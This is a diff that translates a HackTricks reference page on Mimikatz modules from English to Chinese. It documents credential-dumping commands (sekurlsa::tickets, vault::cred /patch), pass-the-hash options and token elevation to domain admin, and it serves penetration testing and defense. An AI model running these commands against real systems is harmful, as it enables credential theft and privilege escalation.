-* Account passwords are stored in memory in a reversible manner. If they are in memory (prior to Windows 8.1/Windows Server 2012 R2 they were), they are displayed. Windows 8.1/Windows Server 2012 R2 doesn’t store the account password in this manner in most cases. KB2871997 “back-ports” this security capability to Windows 7, Windows 8, Windows Server 2008R2, and Windows Server 2012, though the computer needs additional configuration after applying KB2871997.
-* Requires administrator access (with debug rights) or Local SYSTEM rights
+* 在LSASS中转储当前登录（或最近登录）账户的密码数据，以及在用户凭据上下文中运行的服务。
+* 账户密码以可逆的方式存储在内存中。如果它们在内存中（在Windows 8.1/Windows Server 2012 R2之前是这样），它们将被显示出来。Windows 8.1/Windows Server 2012 R2在大多数情况下不以这种方式存储账户密码。KB2871997将此安全功能“回溯”到Windows 7、Windows 8、Windows Server 2008R2和Windows Server 2012，但应用KB2871997后，计算机需要进行额外的配置。
+* 需要管理员访问权限（具有调试权限）或本地SYSTEM权限
 
-**SEKURLSA::Minidump** – switch to LSASS minidump process context (read lsass dump)
+**SEKURLSA::Minidump** – 切换到LSASS minidump进程上下文（读取lsass转储）
 
-**SEKURLSA::Pth** – Pass-the-Hash and Over-Pass-the-Hash (aka pass the key).
+**SEKURLSA::Pth** – 传递哈希和超越传递哈希（也称为传递密钥）。
 
-_Mimikatz can perform the well-known operation ‘Pass-The-Hash’ to run a process under another credentials with NTLM hash of the user’s password, instead of its real password. For this, it starts a process with a fake identity, then replaces fake information (NTLM hash of the fake password) with real information (NTLM hash of the real password)._
+_Mimikatz可以执行众所周知的“传递哈希”操作，以使用用户密码的NTLM哈希而不是实际密码在另一个凭据下运行进程。为此，它使用一个虚假的身份启动一个进程，然后用真实信息（真实密码的NTLM哈希）替换虚假信息（虚假密码的NTLM哈希）。_
 
-* /user – the username you want to impersonate, keep in mind that Administrator is not the only name for this well-known account.
-* /domain – the fully qualified domain name – without domain or in case of local user/admin, use computer or server name, workgroup or whatever.
-* /rc4 or /ntlm – optional – the RC4 key / NTLM hash of the user’s password.
-* /run – optional – the command line to run – default is: cmd to have a shell.
+* /user – 您想要模拟的用户名，请记住，Administrator不是这个众所周知账户的唯一名称。
+* /domain – 完全限定的域名 - 如果没有域或在本地用户/管理员的情况下，请使用计算机或服务器名称、工作组或其他名称。
+* /rc4或/ntlm – 可选 - 用户密码的RC4密钥/NTLM哈希。
+* /run – 可选 - 要运行的命令行 - 默认为：cmd以获得一个shell。
 
 [![Mimikatz-Sekurlsa-PTH](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-PTH.jpg)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-PTH.jpg)
 
-**SEKURLSA::Tickets** – Lists all available Kerberos tickets for all recently authenticated users, including services running under the context of a user account and the local computer’s AD computer account.\
-Unlike kerberos::list, sekurlsa uses memory reading and is not subject to key export restrictions. sekurlsa can access tickets of others sessions (users).
+**SEKURLSA::Tickets** – 列出所有最近认证用户的Kerberos票据，包括在用户账户上下文中运行的服务和本地计算机的AD计算机账户。\
+与kerberos::list不同，sekurlsa使用内存读取，不受密钥导出限制。sekurlsa可以访问其他会话（用户）的票据。
 
-* /export – optional – tickets are exported in .kirbi files. They start with user’s LUID and group number (0 = TGS, 1 = client ticket(?) and 2 = TGT)
+* /export – 可选 – 票据以.kirbi文件导出。它们以用户的LUID和组号开头（0 = TGS，1 = 客户端票据(?)和2 = TGT）
 
-Similar to credential dumping from LSASS, using the sekurlsa module, an attacker can get all Kerberos ticket data in memory on a system, including those belonging to an admin or service.\
-This is extremely useful if an attacker has compromised a web server configured for Kerberos delegation that users access with a backend SQL server. This enables an attacker to capture and reuse all user tickets in memory on that server.
+与从LSASS转储凭据类似，使用sekurlsa模块，攻击者可以在系统内存中获取所有Kerberos票据数据，包括管理员或服务的票据。\
+如果攻击者已经入侵了一个配置了Kerberos委派的Web服务器，并且用户使用后端SQL服务器访问该服务器，这将非常有用。这使得攻击者能够在该服务器上捕获和重用所有用户票据的内存。
 
-The “kerberos::tickets” mimikatz command dumps the current logged-on user’s Kerberos tickets and does not require elevated rights. Leveraging the sekurlsa module’s capability to read from protected memory (LSASS), all Kerberos tickets on the system can be dumped.
+“kerberos::tickets” mimikatz命令转储当前登录用户的Kerberos票据，不需要提升权限。利用sekurlsa模块读取受保护内存（LSASS）的能力，可以转储系统上的所有Kerberos票据。
 
-Command: _mimikatz sekurlsa::tickets exit_
+命令：_mimikatz sekurlsa::tickets exit_
 
-* Dumps all authenticated Kerberos tickets on a system.
-* Requires administrator access (with debug) or Local SYSTEM rights
+* 转储系统上所有已认证的Kerberos票据。
+* 需要管理员访问权限（具有调试权限）或本地SYSTEM权限
 
 ### **SID**
 
-The Mimikatz SID module replaces MISC::AddSID. Use SID::Patch to patch the ntds service.
+Mimikatz SID模块替代了MISC::AddSID。使用SID::Patch来修补ntds服务。
 
-**SID::add** – Add a SID to SIDHistory of an object
+**SID::add** – 将SID添加到对象的SIDHistory中
 
 [![Mimikatz-SID-add](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-add.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-add.png)
 
-**SID::modify** – Modify object SID of an object
+**SID::modify** – 修改对象的对象SID
 
 [![Mimikatz-SID-Modify](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-Modify.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-Modify.png)
 
 ### **TOKEN**
 
-The Mimikatz Token module enables Mimikatz to interact with Windows authentication tokens, including grabbing and impersonating existing tokens.
+Mimikatz Token模块使Mimikatz能够与Windows身份验证令牌进行交互，包括获取和模拟现有令牌。
 
-**TOKEN::Elevate** – impersonate a token. Used to elevate permissions to SYSTEM (default) or find a domain admin token on the box using the Windows API.\
-_Requires Administrator rights._
+**TOKEN::Elevate** – 模拟一个令牌。用于提升权限到SYSTEM（默认）或使用Windows API在盒子上查找域管理员令牌。\
+_需要管理员权限。_
 
 [![Mimikatz-Token-Elevate1](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate1-1.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate1-1.png)
 
-Find a domain admin credential on the box and use that token: _token::elevate /domainadmin_
+在盒子上找到一个域管理员凭据并使用该令牌：_token::elevate /domainadmin_
 
 [![Mimikatz-Token-Elevate-DomainAdmin](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate-DomainAdmin.jpg)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate-DomainAdmin.jpg)
 
-**TOKEN::List** – list all tokens of the system
+**TOKEN::List** – 列出系统上的所有令牌
 
 ### **TS**
 
-**TS::MultiRDP** – (experimental) Patch Terminal Server service to allow multiple users
+**TS::MultiRDP** – （实验性）修补终端服务器服务以允许多个用户
 
 [![Mimikatz-TS-MultiRDP](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-TS-MultiRDP.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-TS-MultiRDP.png)
 
-**TS::Sessions** – List TS/RDP sessions.
+**TS::Sessions** – 列出TS/RDP会话。
 
 ![](https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-TS-Sessions.png)
+### 保险库
 
-### Vault
-
-`mimikatz.exe "privilege::debug" "token::elevate" "vault::cred /patch" "exit"` - Get passwords of scheduled tasks
+`mimikatz.exe "privilege::debug" "token::elevate" "vault::cred /patch" "exit"` - 获取计划任务的密码
 
 \
 \
@@ -357,10 +324,10 @@ Find a domain admin credential on the box and use that token: _token::elevate /d
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 发现我们的独家[NFT收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
+* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
+* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
+* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**
 
 </details>
